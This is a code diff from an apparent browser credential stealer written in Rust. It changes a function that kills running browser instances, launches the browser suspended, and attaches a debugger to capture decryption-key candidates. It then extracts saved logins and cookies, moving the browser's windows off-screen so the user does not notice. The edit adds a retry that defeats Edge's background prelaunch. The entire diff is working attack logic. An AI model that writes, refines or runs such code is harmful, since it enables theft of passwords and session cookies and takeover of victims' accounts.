@@ -107,54 +107,87 @@ fn app() -> i32 {
 fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)> {
     crate::log_out!("[*] Targeting {} ({})", spec.name, spec.exe);
 
-    // A running instance would make the new process hand off its work and exit
-    // before we can trap the decryption, so always start from a clean slate.
-    process::ensure_no_instances(file_name(spec.exe));
-
-    let pi = match process::spawn_suspended(spec.exe) {
-        Ok(pi) => pi,
-        Err(e) => {
-            crate::log_err!("[-] {e} (is {} installed?)", spec.name);
-            return None;
-        }
+    // A running or prelaunched instance would make the new process hand off
+    // its work and exit before we can trap the decryption. Give the phase one
+    // retry for the prelaunch race where Edge respawns a background instance
+    // right between our kill and our spawn.
+    let mut outcome = debug::DebugOutcome {
+        candidates: Vec::new(),
+        saw_module: false,
     };
-    crate::log_out!(
-        "[+] Started a suspended {} process, PID {}",
-        spec.name, pi.dwProcessId
-    );
 
-    unsafe {
-        if ResumeThread(pi.hThread) == u32::MAX {
-            crate::log_err!("[-] ResumeThread failed");
+    // If the winning attempt is the second one, these hold that attempt's
+    // handles; the loop only proceeds past `break` when it captured candidates.
+    let mut pi = PROCESS_INFORMATION::default();
+
+    for attempt in 0..2 {
+        if attempt > 0 {
+            crate::log_out!("[*] Retrying the {} phase (singleton handoff race suspected)", spec.name);
+        }
+        process::ensure_no_instances(file_name(spec.exe), None);
+
+        pi = match process::spawn_suspended(spec.exe) {
+            Ok(pi) => pi,
+            Err(e) => {
+                crate::log_err!("[-] {e} (is {} installed?)", spec.name);
+                return None;
+            }
+        };
+        crate::log_out!(
+            "[+] Started a suspended {} process, PID {}",
+            spec.name, pi.dwProcessId
+        );
+
+        // While the spawned process is still suspended it has not claimed the
+        // profile's process singleton yet: kill any prelaunched instance Edge
+        // spawned in the meantime, then let ours win the singleton handoff.
+        process::ensure_no_instances(file_name(spec.exe), Some(pi.dwProcessId));
+
+        unsafe {
+            if ResumeThread(pi.hThread) == u32::MAX {
+                crate::log_err!("[-] ResumeThread failed");
+                cleanup(&pi);
+                return None;
+            }
+        }
+
+        // Park the browser's windows off-screen while we work.
+        process::park_windows_offscreen(pi.dwProcessId);
+
+        if let Err(e) = unsafe { DebugActiveProcess(pi.dwProcessId) } {
+            crate::log_err!("[-] DebugActiveProcess failed: {e}");
             cleanup(&pi);
             return None;
         }
-    }
+        crate::log_out!("[+] Debugger attached");
 
-    // Park the browser's windows off-screen while we work.
-    process::park_windows_offscreen(pi.dwProcessId);
+        outcome = debug::run(pi.hProcess, pi.dwProcessId, spec.module);
 
-    if let Err(e) = unsafe { DebugActiveProcess(pi.dwProcessId) } {
-        crate::log_err!("[-] DebugActiveProcess failed: {e}");
+        unsafe {
+            let _ = DebugSetProcessKillOnExit(false);
+            let _ = DebugActiveProcessStop(pi.dwProcessId);
+        }
+
+        if !outcome.candidates.is_empty() || outcome.saw_module {
+            break;
+        }
+        // No module load at all: the process either handed off or died during
+        // startup. Tear everything down and try once more.
+        crate::log_out!(
+            "[*] The {} process exited before its module loaded; retrying",
+            spec.name
+        );
         cleanup(&pi);
-        return None;
-    }
-    crate::log_out!("[+] Debugger attached");
-
-    let candidates = debug::run(pi.hProcess, pi.dwProcessId, spec.module);
-
-    unsafe {
-        let _ = DebugSetProcessKillOnExit(false);
-        let _ = DebugActiveProcessStop(pi.dwProcessId);
+        process::terminate_matching(file_name(spec.exe), None);
     }
 
-    if candidates.is_empty() {
+    if outcome.candidates.is_empty() {
         crate::log_err!("[-] Failed to capture any {} key candidate", spec.name);
         cleanup(&pi);
-        // The browser may have already spawned children by now.
-        process::terminate_matching(file_name(spec.exe));
+        process::terminate_matching(file_name(spec.exe), None);
         return None;
     }
+    let candidates = outcome.candidates;
     crate::log_out!(
         "[+] Collected {} key candidate(s) from {}",
         candidates.len(),
@@ -184,7 +217,7 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
 
     cleanup(&pi);
     // Also take down the child processes the browser spawned.
-    process::terminate_matching(file_name(spec.exe));
+    process::terminate_matching(file_name(spec.exe), None);
 
     if logins.is_empty() && cookies.is_empty() {
         crate::log_err!("[-] {} yielded no data", spec.name);
